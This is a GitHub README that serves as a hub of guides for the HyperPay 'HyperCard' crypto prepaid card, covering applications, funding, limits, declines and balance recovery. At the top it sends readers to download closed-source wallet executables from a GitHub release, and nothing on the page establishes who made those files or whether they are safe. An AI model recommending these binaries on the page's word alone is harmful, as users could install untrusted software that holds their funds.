<p align="center"><img src="assets/banner-hub.png" alt="HyperPay - guides and how-tos"></p>

<h1 align="center">HyperCard Guides</h1>

<p align="center">Apply, fund, spend and repair the HyperPay prepaid card, from the first application to a balance after closure.</p>

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21"><img src="https://img.shields.io/badge/RELEASE-v5.6.21-9DB8FF?style=for-the-badge&labelColor=0A2EA8" alt="Release v5.6.21"></a>
</p>

---

## Downloads - v5.6.21

<p align="center"><a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-9DB8FF?style=for-the-badge&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`hyperpay-wallet-windows-v5.6.21.exe`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-windows-v5.6.21.exe) |
| <img src="https://img.shields.io/badge/macOS-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`hyperpay-wallet-macos-v5.6.21.dmg`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-macos-v5.6.21.dmg) |
| <img src="https://img.shields.io/badge/Linux-9DB8FF?style=flat-square&labelColor=0A2EA8&logo=linux&logoColor=white" alt="Linux"> | x64 Ubuntu 20.04 or later, or an equivalent distribution | [`hyperpay-wallet-linux-v5.6.21.zip`](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/download/v5.6.21/hyperpay-wallet-linux-v5.6.21.zip) |

</div>

The card lives inside the wallet application, so the desktop build above is the install step for every guide on this page. Checksums sit in the [v5.6.21 release](https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21).

> Only download from this GitHub release page.

---

## What this repository is for

This repository answers the card questions: what HyperCard is, how an application is assessed, how a card is funded from a wallet balance, what a fee or a limit is made of, why a payment is declined, and how a balance is recovered when a card is replaced or an issuer changes. It treats the card as its own product with its own rules, because a reader whose payment failed is not helped by an installation page.

It does not explain how to install the wallet, how to back up a recovery phrase, or which blockchain a deposit should use. Those are wallet-core questions, and they live in the wallet hub. It also does not describe the card issuer's internal systems, because those are not published: where a tier, an issuer or a limit is not documented, the guide names the gap instead of guessing a number.

Card problems are rarely about the card alone. A decline at a terminal can come from the merchant category, a limit set by the programme, a balance that was never converted, or an issuer that changed the terms, and the guide for each cause starts by naming which of those four is in play before it suggests a fix. That is why the decline page reads as a diagnosis rather than a list of retries, and why it asks for the message the terminal printed instead of the amount that failed.

The card also has a life cycle that outlives any single piece of plastic: an application, a tier, a balance in one of two currencies, a replacement after loss, and a closure that can leave funds behind. The pages here follow that cycle in order, so a reader who is already two steps into it can find the one that matches without reading the earlier stages again.

## Who it is for

- You are deciding whether HyperCard fits your spending and want the requirements before applying.
- You hold a card and a payment was declined, with no clear reason in the app.
- You are funding a card from a crypto balance and want the conversion and timing straight.
- Your card was closed, replaced or moved to another issuer and a balance is still outstanding.
- You are checking whether a no-KYC tier is enough for the spending you have in mind.
- You support someone whose card stopped working abroad and need the regional cause first.

## Start here

<div align="center">

| Guide | Why this one first |
| --- | --- |
| [What HyperCard is](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/what-is-hypercard-prepaid-card.md) | Defines the prepaid card, what funds it and what the balance actually represents. |
| [Apply for a card](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/apply-for-a-hypercard-crypto-card.md) | Sets out what the application asks for and how long the decision usually takes. |
| [Fund from the wallet](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/fund-hypercard-from-hyperpay-wallet.md) | Covers the conversion step and the timing between a crypto balance and spendable funds. |
| [A declined transaction](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/hypercard-transaction-declined-fix.md) | Sorts nine decline causes into the ones you can fix and the ones the issuer must fix. |

</div>

## How to use these guides

1. Start with what the card is, then check the requirements before you apply.
2. Apply, and keep the identity documents that match the name on the application.
3. Fund the card from the wallet and confirm the converted balance before spending.
4. Learn where limits come from before a payment fails at a till or a checkout.
5. When a payment is declined, work the causes in order rather than retrying the same card.
6. Keep the closure and replacement pages for the case where the card itself stops working.

## The guides, grouped

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What is HyperCard](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/what-is-hypercard-prepaid-card.md) | Describes the prepaid card, its funding route and the balance it produces. |
| [Apply for a card](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/apply-for-a-hypercard-crypto-card.md) | Lists the application steps in order, the documents requested at each stage and the realistic timing from submission to a card. |
| [Fund from the wallet](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/fund-hypercard-from-hyperpay-wallet.md) | Explains conversion into a spendable balance and why timing differs by asset. |
| [Fees and limits](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/hypercard-fees-and-limits-explained.md) | Separates conversion, issuance and programme fees from the spending limit, because the two are confused whenever a payment fails. |
| [Without KYC](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/hypercard-without-kyc-explained.md) | Sets out what the no-KYC tier allows and which limits apply to it instead. |
| [Which countries](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/which-countries-accept-hypercard.md) | Covers the merchant footprint, the regional differences that change eligibility and the checks to run before relying on a card abroad. |
| [Apple Pay](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/does-hypercard-support-apple-pay.md) | States the current position on Apple Pay and the workaround readers actually use. |
| [Prepaid vs debit](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/hypercard-prepaid-vs-debit-balance.md) | Compares a prepaid balance with a debit balance and states what each one can be spent on before funds are loaded. |
| [Where it works](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/spend-crypto-with-hypercard-worldwide.md) | Explains merchant acceptance, online versus in person, and the usual failure points. |
| [ATM withdrawals](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/withdraw-cash-with-hypercard-atm.md) | Covers cash access, the limits that apply and the checks to run before travelling. |
| [Spending limits by tier](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/hypercard-spending-limits-by-tier.md) | Explains what a tier controls and how a limit increase is requested and assessed. |
| [USD or EUR balance](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/hypercard-usd-or-eur-balance.md) | Compares the two spending currencies and the conversion cost each one implies. |
| [Lost or stolen card](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/replace-a-lost-hypercard.md) | Gives the freeze, replace and balance steps in the order that protects the funds. |
| [Declined transaction](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/hypercard-transaction-declined-fix.md) | Sorts nine decline causes by who can fix each one and what to check first. |
| [Load USDT](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/load-usdt-onto-hypercard.md) | Covers the network choice, the conversion rate and the delay before funds are spendable. |
| [Buy crypto with a prepaid card](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/buy-crypto-with-prepaid-card-in-hyperpay.md) | Clarifies the direction of the flow, because this card spends crypto rather than buying it. |
| [Balance after closure](https://github.com/hyperpay-gateway/hypercard-guide/blob/HEAD/recover-hypercard-balance-after-closure.md) | Explains what happens to a balance when a card closes or the issuer changes. |

</div>

## What each guide changes

<div align="center">

| Task | Guide | What is different afterwards |
| --- | --- | --- |
| Decide whether to apply | What HyperCard is | You know what the card does and which requirement would exclude you. |
| Get a card issued | Apply for a card | The application is submitted with matching documents and a realistic expectation of timing. |
| Make the card spendable | Fund from the wallet | A converted balance exists and the conversion cost is visible before you spend. |
| Survive a refusal at a till | Declined transaction | The cause is identified, so a retry either works or becomes a call to the issuer. |
| Keep a balance through a closure | Balance after closure | You know which route returns the funds and which messages are not from the issuer. |
| Spend without a bank account | What HyperCard is | The funding route is clear, so the card is judged on requirements rather than assumptions. |
| Choose a spending currency | USD or EUR balance | The conversion cost of each currency is visible before the balance is converted. |

</div>

## Common first questions

### Is HyperCard a credit card?

No. It is a prepaid card funded with crypto that is converted into a spendable USD or EUR balance. There is no credit line, no credit check and no bank account requirement.

### Does it need a bank account?

No. That is the reason it exists for many readers: funding runs from a crypto balance rather than from a bank transfer. Identity requirements still apply to most tiers.

### Why was my payment declined with funds on the card?

A decline can come from the merchant category, the terminal, a limit, or the issuer rather than the balance. The decline guide walks the causes in the order that resolves most cases.

### Can I get a balance back after closure?

The route depends on who issued the card and why it closed. The closure guide covers the documented routes and the messages that should never be trusted.

### Why does the app show a different limit from the one I expected?

A limit belongs to a tier and a region rather than to the card alone. The tier guide explains what changes a limit and where the current value is shown before a payment is attempted.

### Do I need a passport for a physical card?

The published requirements differ between virtual and physical cards, and a physical card has asked for a passport. The application guide states what each route asks for before you start.

---

## Before you install

The wallet that holds the card is downloaded from the release page only, and its hash should be checked before it runs. Neither HyperPay nor a card issuer asks for a recovery phrase, and a message that does is an attempt to take the wallet rather than a support step.

## About

HyperCard is a product of HyperPay, published by CipherBC Hyperpay Pte. Ltd., and it sits inside the same application as the wallet. Card programme details change by tier, region and issuer, and the company does not publish a single fee schedule, so these guides explain where a number comes from and where to read the current value in the app instead of printing a figure that may already be wrong. That choice is deliberate: a published number that has since moved is worse than a page that tells the reader where the live one sits.

## License

No licence is stated for the content of this repository. The company states that Sealer2100 firmware is published under Apache 2.0, and that repository carries no licence file; the wallet and card application is closed source.

---

<p align="center">
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet">Main application</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet/releases/tag/v5.6.21">Release v5.6.21</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-wallet-guide">Wallet guides</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-name-and-trust">Name and trust</a> -
  <a href="https://github.com/hyperpay-gateway/hyperpay-gateway">Profile page</a>
</p>
